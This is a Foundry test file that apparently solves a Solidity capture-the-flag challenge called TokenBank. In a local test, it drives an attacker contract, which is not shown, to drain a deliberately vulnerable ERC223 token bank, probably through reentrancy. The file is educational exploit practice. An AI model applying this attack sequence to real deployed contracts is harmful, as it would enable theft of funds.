// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {SimpleERC223Token, TokenBankChallenge, TokenBankAttacker} from "../../src/Week8-9/TokenBank.sol";

//forge test --match-contract TokenBankTest -vvvv
contract TokenBankTest is Test {
    TokenBankChallenge public tokenBankChallenge;
    TokenBankAttacker public tokenBankAttacker;
    SimpleERC223Token public token;

    address player = address(1234);

    function setUp() public {}

    function testExploit() public {
        tokenBankChallenge = new TokenBankChallenge(player);
        tokenBankAttacker = new TokenBankAttacker(address(tokenBankChallenge));
        token = tokenBankChallenge.token();

        // Put your solution here
        vm.startPrank(player);
        tokenBankChallenge.withdraw(500_000 * 10 ** 18);
        token.approve(address(tokenBankAttacker), type(uint256).max);
        uint256 playerBalance = token.balanceOf(player);
        tokenBankAttacker.depositToAttackContract(playerBalance);
        tokenBankAttacker.depositToTokenBank(playerBalance);
        tokenBankAttacker.attack(playerBalance);
        vm.stopPrank();

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(tokenBankChallenge.isComplete(), "Challenge Incomplete");
    }
}
